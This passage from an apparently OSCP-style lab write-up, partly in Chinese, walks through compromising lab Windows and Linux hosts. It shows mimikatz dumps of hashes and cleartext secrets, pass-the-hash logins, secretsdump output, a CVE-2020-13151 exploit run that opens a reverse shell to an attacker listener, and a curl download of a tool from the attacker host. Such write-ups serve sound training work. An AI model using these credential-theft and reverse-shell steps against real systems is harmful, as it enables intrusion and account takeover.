	 * Username : Mary.Williams
	 * Domain   : MS01
	 * NTLM     : 9a3121977ee93af56ebd0ef4f527a35e
	 * SHA1     : 4b1beca6645e6c3edb991248bcd992ec2a90fbb5
	tspkg :	
	wdigest :	
	 * Username : Mary.Williams
	 * Domain   : MS01
	 * Password : (null)
	kerberos :	
	 * Username : Mary.Williams
	 * Domain   : MS01
	 * Password : (null)
	ssp :	
	credman :	
	cloudap :	

Authentication Id : 0 ; 135819 (00000000:0002128b)
Session           : Service from 0
User Name         : Mary.Williams
Domain            : MS01
Logon Server      : MS01
Logon Time        : 2/12/2025 4:45:38 PM
SID               : S-1-5-21-2114389728-3978811169-1968162427-1002
	msv :	
	 [00000003] Primary
	 * Username : Mary.Williams
	 * Domain   : MS01
	 * NTLM     : 9a3121977ee93af56ebd0ef4f527a35e
	 * SHA1     : 4b1beca6645e6c3edb991248bcd992ec2a90fbb5
	tspkg :	
	wdigest :	
	 * Username : Mary.Williams
	 * Domain   : MS01
	 * Password : (null)
	kerberos :	
	 * Username : Mary.Williams
	 * Domain   : MS01
	 * Password : (null)
	ssp :	
	credman :	
	cloudap :	

Authentication Id : 0 ; 134785 (00000000:00020e81)
Session           : Service from 0
User Name         : Mary.Williams
Domain            : MS01
Logon Server      : MS01
Logon Time        : 2/12/2025 4:45:38 PM
SID               : S-1-5-21-2114389728-3978811169-1968162427-1002
	msv :	
	 [00000003] Primary
	 * Username : Mary.Williams
	 * Domain   : MS01
	 * NTLM     : 9a3121977ee93af56ebd0ef4f527a35e
	 * SHA1     : 4b1beca6645e6c3edb991248bcd992ec2a90fbb5
	tspkg :	
	wdigest :	
	 * Username : Mary.Williams
	 * Domain   : MS01
	 * Password : (null)
	kerberos :	
	 * Username : Mary.Williams
	 * Domain   : MS01
	 * Password : (null)
	ssp :	
	credman :	
	cloudap :	

Authentication Id : 0 ; 85333 (00000000:00014d55)
Session           : Interactive from 1
User Name         : DWM-1
Domain            : Window Manager
Logon Server      : (null)
Logon Time        : 2/12/2025 4:45:38 PM
SID               : S-1-5-90-0-1
	msv :	
	 [00000003] Primary
	 * Username : MS01$
	 * Domain   : OSCP
	 * NTLM     : 0d94b937ef3562f185262da2d6494e65
	 * SHA1     : 6782e7eea6300acc3ee78b8482ed39ce3834ae05
	tspkg :	
	wdigest :	
	 * Username : MS01$
	 * Domain   : OSCP
	 * Password : (null)
	kerberos :	
	 * Username : MS01$
	 * Domain   : oscp.exam
	 * Password : 8b 01 33 23 1b f7 2a 1a 2d 04 c7 f3 6c 19 9a 18 75 aa 83 20 c5 ca 3a 47 93 e9 f6 df 9b 69 9f f0 78 5d ab 0a c0 c3 a6 27 e4 8f 5d 53 5e ef 0d 96 53 58 22 52 12 5c 43 f3 a7 c3 e3 86 3f b7 1d de 06 2e 29 e2 08 f8 d0 c2 f4 a7 bc 27 50 eb d1 58 68 b2 80 8c 45 55 fe 15 78 66 13 73 92 73 9e cb 18 2e c2 4d a3 2c 2e ef 2c 14 05 4f e4 a6 5b 0b a2 58 78 0e a0 6b a1 6c b9 89 af 6e 88 15 c5 a6 23 76 a4 08 4e 01 47 3d 1a f1 d0 89 89 b9 4e 8f b1 91 2a f9 8c e1 de d4 45 2e 92 9a d5 71 bc d1 e4 2b 51 34 bc bc cf 7f 71 1e 29 5a 79 af 48 9c a7 d6 40 26 f5 67 cf f4 56 02 32 88 47 76 4d a1 b3 62 c7 71 45 36 71 44 68 3a c2 09 7a f6 3e a7 d2 df 15 8f 24 fe b0 d0 f1 f0 d3 47 d5 36 ef 3d b8 d1 94 3e 09 e9 e2 1e 1a 48 aa c6 c4 30 52 2b 
	ssp :	
	credman :	
	cloudap :	

Authentication Id : 0 ; 85162 (00000000:00014caa)
Session           : Interactive from 1
User Name         : DWM-1
Domain            : Window Manager
Logon Server      : (null)
Logon Time        : 2/12/2025 4:45:38 PM
SID               : S-1-5-90-0-1
	msv :	
	 [00000003] Primary
	 * Username : MS01$
	 * Domain   : OSCP
	 * NTLM     : b02e48113ff3f815685ca7b8b35929c4
	 * SHA1     : 1e25487267ada9341bad8e06823fcf0fb66d3022
	tspkg :	
	wdigest :	
	 * Username : MS01$
	 * Domain   : OSCP
	 * Password : (null)
	kerberos :	
	 * Username : MS01$
	 * Domain   : oscp.exam
	 * Password : 7d 3b c2 35 4f 88 a6 06 6e ed 35 af 30 17 a4 29 3f 04 27 0f 05 2c e1 60 fb 86 48 71 55 96 22 ee 25 64 16 0d 5e 68 2d 8e 56 b6 67 66 96 87 d5 6c 24 9c 4d eb 54 ac 5c c9 2f 5a 42 bf a6 10 d0 c5 7a a4 30 7d 3a 3c ab d4 2d fc d9 f3 90 ac a8 76 0a 75 8a 4d 84 cc b2 81 e1 62 a7 11 19 e7 ac b5 1a 8a a7 ef b5 04 c2 2a 3e 44 2f e2 91 a8 12 e6 9b 7e 94 78 59 0f 88 3f 34 e8 01 aa ca fb 04 75 94 cf 24 35 dc 37 25 35 4c 5f 5e bb 6c 52 5d 04 4d af e1 11 96 1d ca 7a eb 54 b1 2d 03 dd 86 c8 f8 92 84 66 d7 53 cb 24 e3 23 15 46 0b 7c 54 c9 c5 0c a9 14 16 e7 15 ee d5 99 a3 c7 a7 5d 9f 76 68 45 12 2f b3 b4 a1 92 5f f3 db 80 da b2 f0 d3 96 cb 65 5d 2e 48 dc e5 0c 39 a5 b2 94 31 fa 31 4e f3 92 e3 98 73 73 05 e7 29 46 3c 57 67 b8 26 
	ssp :	
	credman :	
	cloudap :	

Authentication Id : 0 ; 997 (00000000:000003e5)
Session           : Service from 0
User Name         : LOCAL SERVICE
Domain            : NT AUTHORITY
Logon Server      : (null)
Logon Time        : 2/12/2025 4:45:38 PM
SID               : S-1-5-19
	msv :	
	tspkg :	
	wdigest :	
	 * Username : (null)
	 * Domain   : (null)
	 * Password : (null)
	kerberos :	
	 * Username : (null)
	 * Domain   : (null)
	 * Password : (null)
	ssp :	
	credman :	
	cloudap :	

Authentication Id : 0 ; 996 (00000000:000003e4)
Session           : Service from 0
User Name         : MS01$
Domain            : OSCP
Logon Server      : (null)
Logon Time        : 2/12/2025 4:45:37 PM
SID               : S-1-5-20
	msv :	
	 [00000003] Primary
	 * Username : MS01$
	 * Domain   : OSCP
	 * NTLM     : b02e48113ff3f815685ca7b8b35929c4
	 * SHA1     : 1e25487267ada9341bad8e06823fcf0fb66d3022
	tspkg :	
	wdigest :	
	 * Username : MS01$
	 * Domain   : OSCP
	 * Password : (null)
	kerberos :	
	 * Username : ms01$
	 * Domain   : OSCP.EXAM
	 * Password : 7d 3b c2 35 4f 88 a6 06 6e ed 35 af 30 17 a4 29 3f 04 27 0f 05 2c e1 60 fb 86 48 71 55 96 22 ee 25 64 16 0d 5e 68 2d 8e 56 b6 67 66 96 87 d5 6c 24 9c 4d eb 54 ac 5c c9 2f 5a 42 bf a6 10 d0 c5 7a a4 30 7d 3a 3c ab d4 2d fc d9 f3 90 ac a8 76 0a 75 8a 4d 84 cc b2 81 e1 62 a7 11 19 e7 ac b5 1a 8a a7 ef b5 04 c2 2a 3e 44 2f e2 91 a8 12 e6 9b 7e 94 78 59 0f 88 3f 34 e8 01 aa ca fb 04 75 94 cf 24 35 dc 37 25 35 4c 5f 5e bb 6c 52 5d 04 4d af e1 11 96 1d ca 7a eb 54 b1 2d 03 dd 86 c8 f8 92 84 66 d7 53 cb 24 e3 23 15 46 0b 7c 54 c9 c5 0c a9 14 16 e7 15 ee d5 99 a3 c7 a7 5d 9f 76 68 45 12 2f b3 b4 a1 92 5f f3 db 80 da b2 f0 d3 96 cb 65 5d 2e 48 dc e5 0c 39 a5 b2 94 31 fa 31 4e f3 92 e3 98 73 73 05 e7 29 46 3c 57 67 b8 26 
	ssp :	
	credman :	
	cloudap :	

Authentication Id : 0 ; 48838 (00000000:0000bec6)
Session           : Interactive from 1
User Name         : UMFD-1
Domain            : Font Driver Host
Logon Server      : (null)
Logon Time        : 2/12/2025 4:45:37 PM
SID               : S-1-5-96-0-1
	msv :	
	 [00000003] Primary
	 * Username : MS01$
	 * Domain   : OSCP
	 * NTLM     : b02e48113ff3f815685ca7b8b35929c4
	 * SHA1     : 1e25487267ada9341bad8e06823fcf0fb66d3022
	tspkg :	
	wdigest :	
	 * Username : MS01$
	 * Domain   : OSCP
	 * Password : (null)
	kerberos :	
	 * Username : MS01$
	 * Domain   : oscp.exam
	 * Password : 7d 3b c2 35 4f 88 a6 06 6e ed 35 af 30 17 a4 29 3f 04 27 0f 05 2c e1 60 fb 86 48 71 55 96 22 ee 25 64 16 0d 5e 68 2d 8e 56 b6 67 66 96 87 d5 6c 24 9c 4d eb 54 ac 5c c9 2f 5a 42 bf a6 10 d0 c5 7a a4 30 7d 3a 3c ab d4 2d fc d9 f3 90 ac a8 76 0a 75 8a 4d 84 cc b2 81 e1 62 a7 11 19 e7 ac b5 1a 8a a7 ef b5 04 c2 2a 3e 44 2f e2 91 a8 12 e6 9b 7e 94 78 59 0f 88 3f 34 e8 01 aa ca fb 04 75 94 cf 24 35 dc 37 25 35 4c 5f 5e bb 6c 52 5d 04 4d af e1 11 96 1d ca 7a eb 54 b1 2d 03 dd 86 c8 f8 92 84 66 d7 53 cb 24 e3 23 15 46 0b 7c 54 c9 c5 0c a9 14 16 e7 15 ee d5 99 a3 c7 a7 5d 9f 76 68 45 12 2f b3 b4 a1 92 5f f3 db 80 da b2 f0 d3 96 cb 65 5d 2e 48 dc e5 0c 39 a5 b2 94 31 fa 31 4e f3 92 e3 98 73 73 05 e7 29 46 3c 57 67 b8 26 
	ssp :	
	credman :	
	cloudap :	

Authentication Id : 0 ; 48788 (00000000:0000be94)
Session           : Interactive from 0
User Name         : UMFD-0
Domain            : Font Driver Host
Logon Server      : (null)
Logon Time        : 2/12/2025 4:45:37 PM
SID               : S-1-5-96-0-0
	msv :	
	 [00000003] Primary
	 * Username : MS01$
	 * Domain   : OSCP
	 * NTLM     : b02e48113ff3f815685ca7b8b35929c4
	 * SHA1     : 1e25487267ada9341bad8e06823fcf0fb66d3022
	tspkg :	
	wdigest :	
	 * Username : MS01$
	 * Domain   : OSCP
	 * Password : (null)
	kerberos :	
	 * Username : MS01$
	 * Domain   : oscp.exam
	 * Password : 7d 3b c2 35 4f 88 a6 06 6e ed 35 af 30 17 a4 29 3f 04 27 0f 05 2c e1 60 fb 86 48 71 55 96 22 ee 25 64 16 0d 5e 68 2d 8e 56 b6 67 66 96 87 d5 6c 24 9c 4d eb 54 ac 5c c9 2f 5a 42 bf a6 10 d0 c5 7a a4 30 7d 3a 3c ab d4 2d fc d9 f3 90 ac a8 76 0a 75 8a 4d 84 cc b2 81 e1 62 a7 11 19 e7 ac b5 1a 8a a7 ef b5 04 c2 2a 3e 44 2f e2 91 a8 12 e6 9b 7e 94 78 59 0f 88 3f 34 e8 01 aa ca fb 04 75 94 cf 24 35 dc 37 25 35 4c 5f 5e bb 6c 52 5d 04 4d af e1 11 96 1d ca 7a eb 54 b1 2d 03 dd 86 c8 f8 92 84 66 d7 53 cb 24 e3 23 15 46 0b 7c 54 c9 c5 0c a9 14 16 e7 15 ee d5 99 a3 c7 a7 5d 9f 76 68 45 12 2f b3 b4 a1 92 5f f3 db 80 da b2 f0 d3 96 cb 65 5d 2e 48 dc e5 0c 39 a5 b2 94 31 fa 31 4e f3 92 e3 98 73 73 05 e7 29 46 3c 57 67 b8 26 
	ssp :	
	credman :	
	cloudap :	

Authentication Id : 0 ; 46923 (00000000:0000b74b)
Session           : UndefinedLogonType from 0
User Name         : (null)
Domain            : (null)
Logon Server      : (null)
Logon Time        : 2/12/2025 4:45:37 PM
SID               : 
	msv :	
	 [00000003] Primary
	 * Username : MS01$
	 * Domain   : OSCP
	 * NTLM     : b02e48113ff3f815685ca7b8b35929c4
	 * SHA1     : 1e25487267ada9341bad8e06823fcf0fb66d3022
	tspkg :	
	wdigest :	
	kerberos :	
	ssp :	
	credman :	
	cloudap :	

Authentication Id : 0 ; 999 (00000000:000003e7)
Session           : UndefinedLogonType from 0
User Name         : MS01$
Domain            : OSCP
Logon Server      : (null)
Logon Time        : 2/12/2025 4:45:37 PM
SID               : S-1-5-18
	msv :	
	tspkg :	
	wdigest :	
	 * Username : MS01$
	 * Domain   : OSCP
	 * Password : (null)
	kerberos :	
	 * Username : ms01$
	 * Domain   : OSCP.EXAM
	 * Password : 7d 3b c2 35 4f 88 a6 06 6e ed 35 af 30 17 a4 29 3f 04 27 0f 05 2c e1 60 fb 86 48 71 55 96 22 ee 25 64 16 0d 5e 68 2d 8e 56 b6 67 66 96 87 d5 6c 24 9c 4d eb 54 ac 5c c9 2f 5a 42 bf a6 10 d0 c5 7a a4 30 7d 3a 3c ab d4 2d fc d9 f3 90 ac a8 76 0a 75 8a 4d 84 cc b2 81 e1 62 a7 11 19 e7 ac b5 1a 8a a7 ef b5 04 c2 2a 3e 44 2f e2 91 a8 12 e6 9b 7e 94 78 59 0f 88 3f 34 e8 01 aa ca fb 04 75 94 cf 24 35 dc 37 25 35 4c 5f 5e bb 6c 52 5d 04 4d af e1 11 96 1d ca 7a eb 54 b1 2d 03 dd 86 c8 f8 92 84 66 d7 53 cb 24 e3 23 15 46 0b 7c 54 c9 c5 0c a9 14 16 e7 15 ee d5 99 a3 c7 a7 5d 9f 76 68 45 12 2f b3 b4 a1 92 5f f3 db 80 da b2 f0 d3 96 cb 65 5d 2e 48 dc e5 0c 39 a5 b2 94 31 fa 31 4e f3 92 e3 98 73 73 05 e7 29 46 3c 57 67 b8 26 
	ssp :	
	credman :	
	cloudap :	

mimikatz # lsadump::secrets
Domain : MS01
SysKey : a5403534b0978445a2df2d30d19a7980

Local name : MS01 ( S-1-5-21-2114389728-3978811169-1968162427 )
Domain name : OSCP ( S-1-5-21-2610934713-1581164095-2706428072 )
Domain FQDN : oscp.exam

Policy subsystem is : 1.18
LSA Key(s) : 1, default {51d601d1-119c-163a-7318-7f9426349648}
  [00] {51d601d1-119c-163a-7318-7f9426349648} 6a730b82a6aa37201014830f2e68216ab15f2bce391265ff3d4fdd22d9e86549

Secret  : $MACHINE.ACC
cur/hex : 7d 3b c2 35 4f 88 a6 06 6e ed 35 af 30 17 a4 29 3f 04 27 0f 05 2c e1 60 fb 86 48 71 55 96 22 ee 25 64 16 0d 5e 68 2d 8e 56 b6 67 66 96 87 d5 6c 24 9c 4d eb 54 ac 5c c9 2f 5a 42 bf a6 10 d0 c5 7a a4 30 7d 3a 3c ab d4 2d fc d9 f3 90 ac a8 76 0a 75 8a 4d 84 cc b2 81 e1 62 a7 11 19 e7 ac b5 1a 8a a7 ef b5 04 c2 2a 3e 44 2f e2 91 a8 12 e6 9b 7e 94 78 59 0f 88 3f 34 e8 01 aa ca fb 04 75 94 cf 24 35 dc 37 25 35 4c 5f 5e bb 6c 52 5d 04 4d af e1 11 96 1d ca 7a eb 54 b1 2d 03 dd 86 c8 f8 92 84 66 d7 53 cb 24 e3 23 15 46 0b 7c 54 c9 c5 0c a9 14 16 e7 15 ee d5 99 a3 c7 a7 5d 9f 76 68 45 12 2f b3 b4 a1 92 5f f3 db 80 da b2 f0 d3 96 cb 65 5d 2e 48 dc e5 0c 39 a5 b2 94 31 fa 31 4e f3 92 e3 98 73 73 05 e7 29 46 3c 57 67 b8 26 
    NTLM:b02e48113ff3f815685ca7b8b35929c4
    SHA1:1e25487267ada9341bad8e06823fcf0fb66d3022
old/hex : 8b 01 33 23 1b f7 2a 1a 2d 04 c7 f3 6c 19 9a 18 75 aa 83 20 c5 ca 3a 47 93 e9 f6 df 9b 69 9f f0 78 5d ab 0a c0 c3 a6 27 e4 8f 5d 53 5e ef 0d 96 53 58 22 52 12 5c 43 f3 a7 c3 e3 86 3f b7 1d de 06 2e 29 e2 08 f8 d0 c2 f4 a7 bc 27 50 eb d1 58 68 b2 80 8c 45 55 fe 15 78 66 13 73 92 73 9e cb 18 2e c2 4d a3 2c 2e ef 2c 14 05 4f e4 a6 5b 0b a2 58 78 0e a0 6b a1 6c b9 89 af 6e 88 15 c5 a6 23 76 a4 08 4e 01 47 3d 1a f1 d0 89 89 b9 4e 8f b1 91 2a f9 8c e1 de d4 45 2e 92 9a d5 71 bc d1 e4 2b 51 34 bc bc cf 7f 71 1e 29 5a 79 af 48 9c a7 d6 40 26 f5 67 cf f4 56 02 32 88 47 76 4d a1 b3 62 c7 71 45 36 71 44 68 3a c2 09 7a f6 3e a7 d2 df 15 8f 24 fe b0 d0 f1 f0 d3 47 d5 36 ef 3d b8 d1 94 3e 09 e9 e2 1e 1a 48 aa c6 c4 30 52 2b 
    NTLM:0d94b937ef3562f185262da2d6494e65
    SHA1:6782e7eea6300acc3ee78b8482ed39ce3834ae05

Secret  : DefaultPassword
cur/text: 7k8XHk3dMtmpnC7

Secret  : DPAPI_SYSTEM
cur/hex : 01 00 00 00 14 cc 9a cc bb 06 d4 af 8f 07 29 57 49 93 3b 06 cf 0d 6d fd 4c 31 eb 80 2e 35 29 d3 4f 19 8a 04 73 a6 74 5c f5 94 85 27 
    full: 14cc9accbb06d4af8f07295749933b06cf0d6dfd4c31eb802e3529d34f198a0473a6745cf5948527
    m/u : 14cc9accbb06d4af8f07295749933b06cf0d6dfd / 4c31eb802e3529d34f198a0473a6745cf5948527
old/hex : 01 00 00 00 00 21 20 4a 5d 28 d3 d0 74 90 83 dc 62 ca af 56 49 25 54 cb 72 72 c0 ec 42 6e 4a ca 5e af 59 a9 7c 48 20 25 d6 1d 0e b7 
    full: 0021204a5d28d3d0749083dc62caaf56492554cb7272c0ec426e4aca5eaf59a97c482025d61d0eb7
    m/u : 0021204a5d28d3d0749083dc62caaf56492554cb / 7272c0ec426e4aca5eaf59a97c482025d61d0eb7

Secret  : NL$KM
cur/hex : f1 9f 8d 0a 3d 6b 2d 13 69 96 2e 4c 32 4d c3 66 d5 36 97 ab 1f 0b f2 38 11 3e df 05 ae df 31 70 c0 e3 97 a0 08 31 a9 2a e3 88 48 dd 2c 88 86 56 83 c9 79 90 03 d5 9d 28 c1 be 33 d6 0e 7b b7 9b 
old/hex : f1 9f 8d 0a 3d 6b 2d 13 69 96 2e 4c 32 4d c3 66 d5 36 97 ab 1f 0b f2 38 11 3e df 05 ae df 31 70 c0 e3 97 a0 08 31 a9 2a e3 88 48 dd 2c 88 86 56 83 c9 79 90 03 d5 9d 28 c1 be 33 d6 0e 7b b7 9b 

Secret  : _SC_wampapache64 / service 'wampapache64' with username : .\Mary.Williams
cur/text: 69jHwjGN2bPQFvJ

Secret  : _SC_wampmariadb64 / service 'wampmariadb64' with username : .\Mary.Williams
cur/text: 69jHwjGN2bPQFvJ

Secret  : _SC_wampmysqld64 / service 'wampmysqld64' with username : .\Mary.Williams
cur/text: 69jHwjGN2bPQFvJ

mimikatz # dpapi::cache

CREDENTIALS cache
=================
SID:S-1-5-21-2610934713-1581164095-2706428072-1105;;MD4:e728ecbadfb02f51ce8eed753f3ff3fd;SHA1:8cb61017910862af238631bf7aaae38df64998cd;
SID:S-1-5-21-2114389728-3978811169-1968162427-1002;;MD4:9a3121977ee93af56ebd0ef4f527a35e;SHA1:4b1beca6645e6c3edb991248bcd992ec2a90fbb5;

MASTERKEYS cache
================

DOMAINKEYS cache
================

mimikatz # 

```

# MS01 To DC01 10.10.168.140

Found the `celia.almeda : e728ecbadfb02f51ce8eed753f3ff3fd` and base on that to go the 10.10.168.140

![Pasted image 20251215155631.png](/ob/Pasted%20image%2020251215155631.png)

```shell
┌──(root㉿kali)-[~/Desktop]
└─# netexec winrm  10.10.168.141/24 -u 'celia.almeda' -H 'e728ecbadfb02f51ce8eed753f3ff3fd' 
WINRM       10.10.168.142   5985   MS02             [*] Windows 10 / Server 2019 Build 19041 (name:MS02) (domain:oscp.exam)
WINRM       10.10.168.140   5985   DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:oscp.exam)
WINRM       10.10.168.141   5985   MS01             [*] Windows 10 / Server 2019 Build 19041 (name:MS01) (domain:oscp.exam)
/usr/lib/python3/dist-packages/spnego/_ntlm_raw/crypto.py:46: CryptographyDeprecationWarning: ARC4 has been moved to cryptography.hazmat.decrepit.ciphers.algorithms.ARC4 and will be removed from this module in 48.0.0.
  arc4 = algorithms.ARC4(self._key)
WINRM       10.10.168.142   5985   MS02             [+] oscp.exam\celia.almeda:e728ecbadfb02f51ce8eed753f3ff3fd (Pwn3d!)
/usr/lib/python3/dist-packages/spnego/_ntlm_raw/crypto.py:46: CryptographyDeprecationWarning: ARC4 has been moved to cryptography.hazmat.decrepit.ciphers.algorithms.ARC4 and will be removed from this module in 48.0.0.
  arc4 = algorithms.ARC4(self._key)
WINRM       10.10.168.140   5985   DC01             [-] oscp.exam\celia.almeda:e728ecbadfb02f51ce8eed753f3ff3fd
/usr/lib/python3/dist-packages/spnego/_ntlm_raw/crypto.py:46: CryptographyDeprecationWarning: ARC4 has been moved to cryptography.hazmat.decrepit.ciphers.algorithms.ARC4 and will be removed from this module in 48.0.0.
  arc4 = algorithms.ARC4(self._key)
WINRM       10.10.168.141   5985   MS01             [-] oscp.exam\celia.almeda:e728ecbadfb02f51ce8eed753f3ff3fd
Running nxc against 256 targets ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ 100% 0:00:00
                                                                                                                                                                                                                
┌──(root㉿kali)-[~/Desktop]
└─# 
```

```shell
┌──(root㉿kali)-[~/Desktop]
└─#  evil-winrm -i 10.10.168.142 -u 'celia.almeda' -H 'e728ecbadfb02f51ce8eed753f3ff3fd'
                                        
Evil-WinRM shell v3.7
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\celia.almeda\Documents> 

```

{{< toggle "Tag 🏷️" >}}

{{< tag "Windows-Privilege-Escalation-windows-Files" >}} The windows.old file should not be here , which will backup a lot of sensitive data

{{< /toggle >}}

Windows old should not be here\
![Pasted image 20251215160528.png](/ob/Pasted%20image%2020251215160528.png)

![Pasted image 20251215162641.png](/ob/Pasted%20image%2020251215162641.png)

![Pasted image 20251215162722.png](/ob/Pasted%20image%2020251215162722.png)

找到SAM 和 SYSTEM 在一個奇怪的windows old file ，hint :可以透過目期去估那一個是容易被利用

https://www.thehacker.recipes/ad/movement/credentials/dumping/sam-and-lsa-secrets

透過 secretsdump 找到administrator 的hash\
不過在使用secretdump 之前 ，要使用ligolo 進行雙樞紐

```
└─# secretsdump.py -sam ./SAM -system ./SYSTEM LOCAL 
Impacket v0.13.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Target system bootKey: 0x8bca2f7ad576c856d79b7111806b533d
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:acbb9b77c62fdd8fe5976148a933177a:::
tom_admin:1001:aad3b435b51404eeaad3b435b51404ee:4979d69d4ca66955c075c41cf45f24dc:::
Cheyanne.Adams:1002:aad3b435b51404eeaad3b435b51404ee:b3930e99899cb55b4aefef9a7021ffd0:::
David.Rhys:1003:aad3b435b51404eeaad3b435b51404ee:9ac088de348444c71dba2dca92127c11:::
Mark.Chetty:1004:aad3b435b51404eeaad3b435b51404ee:92903f280e5c5f3cab018bd91b94c771:::
[*] Cleaning up... 
                                                                                                                                                                                                                                             
┌──(root㉿kali)-[~/Desktop]
└─# 
```

```
evil-winrm -i 10.10.100.140  -u 'tom_admin' -H '4979d69d4ca66955c075c41cf45f24dc'
```

***

# Recon 192.168.X.143

```shell
21/tcp   open  ftp        vsftpd 3.0.3
22/tcp   open  ssh        OpenSSH 8.2p1 Ubuntu 4ubuntu0.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 23:4c:6f:ff:b8:52:29:65:3d:d1:4e:38:eb:fe:01:c1 (RSA)
|   256 0d:fd:36:d8:05:69:83:ef:ae:a0:fe:4b:82:03:32:ed (ECDSA)
|_  256 cc:76:17:1e:8e:c5:57:b2:1f:45:28:09:05:5a:eb:39 (ED25519)
80/tcp   open  http       Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
81/tcp   open  http       Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Test Page for the Nginx HTTP Server on Fedora
443/tcp  open  http       Apache httpd 2.4.41
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
3000/tcp open  ppp?
3001/tcp open  nessus?
3003/tcp open  cgms?
3306/tcp open  mysql      MySQL (unauthorized)
5432/tcp open  postgresql PostgreSQL DB 12.9 - 12.13
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=aero
| Subject Alternative Name: DNS:aero
| Not valid before: 2021-05-10T22:20:48
|_Not valid after:  2031-05-08T22:20:48
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port3003-TCP:V=7.95%I=7%D=12/16%Time=6940C167%P=x86_64-pc-linux-gnu%r(G
SF:enericLines,1,"\n")%r(GetRequest,1,"\n")%r(HTTPOptions,1,"\n")%r(RTSPRe
SF:quest,1,"\n")%r(Help,1,"\n")%r(SSLSessionReq,1,"\n")%r(TerminalServerCo
SF:okie,1,"\n")%r(Kerberos,1,"\n")%r(FourOhFourRequest,1,"\n")%r(LPDString
SF:,1,"\n")%r(LDAPSearchReq,1,"\n")%r(SIPOptions,1,"\n");
Service Info: Host: 127.0.0.2; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

```

### SSH 22 --Scans

> 可以在域上暴力破解主機名/子域。

```
[REDO-ATTEMPT] target 192.168.217.143 - login "pi" - pass "raspberry" - 136 of 136 [child 1] (2/2)
1 of 1 target completed, 0 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-12-16 10:23:27
```

### FTP 21 -- Scans

* 匿名登入
* 爆破登入

> 如果允許任何匿名存取，這可能是取得檔和其他資訊的最佳位置。

```shell
─#  ftp 192.168.217.143
Connected to 192.168.217.143.
220 (vsFTPd 3.0.3)
Name (192.168.217.143:root): anonymous
331 Please specify the password.
Password: 
530 Login incorrect.
ftp: Login failed
ftp> 
```

### CVE-2020-13151

{{< toggle "Tag 🏷️" >}}

{{< tag "CVE-2020-13151" >}} The port 3003 with the help command show that the cms version and it also easy to be RCE attack\
{{< /toggle >}}

https://github.com/b4ny4n/CVE-2020-13151

### port 3003

```
└─# nc -nv 192.168.217.143 3003
(UNKNOWN) [192.168.217.143] 3003 (?) open
help
<del>- [ ] bins;build;build_os;build_time;cluster-name;config-get;config-set;digests;dump-cluster;dump-fabric;dump-hb;dump-hlc;dump-migrates;dump-msgs;dump-rw;dump-si;dump-skew;dump-wb-summary;eviction-reset;feature-key;get-config;get-sl;health-outliers;health-stats;histogram;jem-stats;jobs;latencies;log;log-set;log-message;logs;mcast;mesh;name;namespace;namespaces;node;physical-devices;quiesce;quiesce-undo;racks;recluster;revive;roster;roster-set;service;services;services-alumni;services-alumni-reset;set-config;set-log;sets;show-devices;sindex;sindex-create;sindex-delete;sindex-histogram;statistics;status;tip;tip-clear;truncate;truncate-namespace;truncate-namespace-undo;truncate-undo;version;</del>
version 
```

![Pasted image 20260109150533.png](/ob/Pasted%20image%2020260109150533.png)

```
└─# sudo nc -lvnp 80
listening on [any] 80 ...
connect to [192.168.45.193] from (UNKNOWN) [192.168.228.143] 48028
/bin/sh: 0: can't access tty; job control turned off
$ 

└─# uv run cve2020-13151.py --ahost 192.168.228.143  --pythonshell --lhost=192.168.45.193  --lport=80
[+] aerospike build info: 5.1.0.1

[+] looks vulnerable
[+] populating dummy table.
[+] writing to test.cve202013151
[+] wrote JmArSQGQLiXfCFlA
[+] registering udf


```

![Pasted image 20260109152811.png](/ob/Pasted%20image%2020260109152811.png)

```

┌──(haydon_env)─(root㉿kali)-[~/tools]
└─# sudo python3 -m http.server 21  
Serving HTTP on 0.0.0.0 port 21 (http://0.0.0.0:21/) ...
192.168.228.143 - - [09/Jan/2026 15:32:17] "GET /pspy64 HTTP/1.1" 200 -

-----------------------------------------------------------------------------

$ cd /tmp
$ curl -L http://192.168.45.193:21/pspy64 -o pspy64
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100 3032k  100 3032k    0     0  7150k      0 --:--:-- --:--:-- --:--:-- 7134k
$ 
```

{{< toggle "Tag 🏷️" >}}

{{< tag "Linux-Privilege-Escalation-link-Injection" >}} pspy64 reveal that /usr/bin/asinfo (own by root )will auto run , and the /opt/aerospike/bin/asinfo (own by aero ) is linked to /usr/bin/asinfo, so when i inject the revshell to the /opt/aerospike/bin/asinfo , i will be root\
{{< /toggle >}}

```
$ chmod +x pspy64
$ timeout  120 ./pspy64  -pf -i 1000
pspy - version: v1.2.1 - Commit SHA: f9e6a1590a4312b9faa093d8dc84e19567977a6d


     ██▓███    ██████  ██▓███ ▓██   ██▓
    ▓██░  ██▒▒██    ▒ ▓██░  ██▒▒██  ██▒
    ▓██░ ██▓▒░ ▓██▄   ▓██░ ██▓▒ ▒██ ██░
